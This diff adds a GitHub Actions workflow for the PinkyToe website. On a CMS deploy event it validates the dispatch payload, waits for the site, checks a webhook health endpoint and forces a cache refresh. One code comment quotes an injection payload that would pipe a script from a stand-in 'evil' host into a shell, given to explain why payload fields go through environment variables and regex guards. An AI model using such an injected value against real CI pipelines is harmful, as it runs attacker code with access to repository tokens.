@@ -1,0 +1,84 @@
+name: CMS deployed
+
+# Belongs in pinkytoedev/PinkyToeWebsite, NOT here. See the README in this
+# directory. repository_dispatch only triggers workflows that exist on the
+# target repo's default branch.
+on:
+  repository_dispatch:
+    types: [piscoc1-deployed]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+concurrency:
+  group: cms-deployed
+  cancel-in-progress: false
+
+jobs:
+  refresh:
+    name: Verify the site and force a full cache refresh
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    env:
+      SITE: ${{ vars.SITE_PUBLIC_URL || 'https://www.pinkytoepaper.com' }}
+    steps:
+      # client_payload is network input: anything holding a contents:write token
+      # on this repo can POST it. GitHub expands ${{ }} into the script text
+      # before bash parses it, so interpolating these directly would let a
+      # payload like {"sha": "$(curl -s https://evil|sh)"} execute on this
+      # runner, with the job's GITHUB_TOKEN and ADMIN_TOKEN in reach. Passing
+      # them through the environment makes them inert strings, and the regex
+      # guards keep a hostile value from being rendered as if it were real.
+      - name: Context
+        env:
+          PAYLOAD_SHA: ${{ github.event.client_payload.sha }}
+          PAYLOAD_HEALTH: ${{ github.event.client_payload.health }}
+          PAYLOAD_RUN_URL: ${{ github.event.client_payload.run_url }}
+        run: |
+          sha="${PAYLOAD_SHA:-unknown}"
+          health="${PAYLOAD_HEALTH:-unknown}"
+          run_url="${PAYLOAD_RUN_URL:-}"
+
+          printf '%s' "$sha"    | grep -Eq '^[0-9a-fA-F]{7,40}$|^unknown$'   || sha='(invalid)'
+          printf '%s' "$health" | grep -Eq '^[a-z0-9-]{1,40}$'               || health='(invalid)'
+          printf '%s' "$run_url" | grep -Eq '^https://github\.com/[A-Za-z0-9._/-]+$' || run_url='(invalid)'
+
+          {
+            echo "### Refresh triggered by PISCOC1"
+            echo "- sha: \`${sha}\`"
+            echo "- health: \`${health}\`"
+            echo "- run: ${run_url}"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # railway.toml there sets healthcheckPath = "/", the SPA index; this repo
+      # has no /api/health.
+      - name: Wait for the site to answer
+        run: |
+          for i in $(seq 1 20); do
+            curl -fsS -o /dev/null --max-time 10 "$SITE/" && exit 0
+            sleep 10
+          done
+          echo "::error::site did not answer GET / within ~200s"; exit 1
+
+      # Unauthenticated on main and still unauthenticated after PR #16, so it is
+      # the one smoke target that proves Express and the webhook router mounted.
+      - name: Verify the Express layer and webhook router are mounted
+        run: curl -fsS --max-time 10 "$SITE/api/webhooks/health"
+
+      # POST /api/cache/refresh has no auth on main today, so the header is
+      # added only when the secret exists. Once PR #16 (chore/code-review-refactor)
+      # merges, requireAdmin applies: without ADMIN_TOKEN this returns 503 in
+      # production, and with a wrong one, 401.
+      - name: Force a full cache refresh
+        env:
+          ADMIN_TOKEN: ${{ secrets.ADMIN_TOKEN }}
+        run: |
+          args=(-fsS --max-time 60 -X POST "$SITE/api/cache/refresh"
+                -H 'content-type: application/json' -d '{}')
+          if [ -n "$ADMIN_TOKEN" ]; then
+            args+=(-H "Authorization: Bearer $ADMIN_TOKEN")
+          else
+            echo "::warning::ADMIN_TOKEN is not set - sending the refresh unauthenticated. This works only while /api/cache/refresh is open."
+          fi
+          curl "${args[@]}"
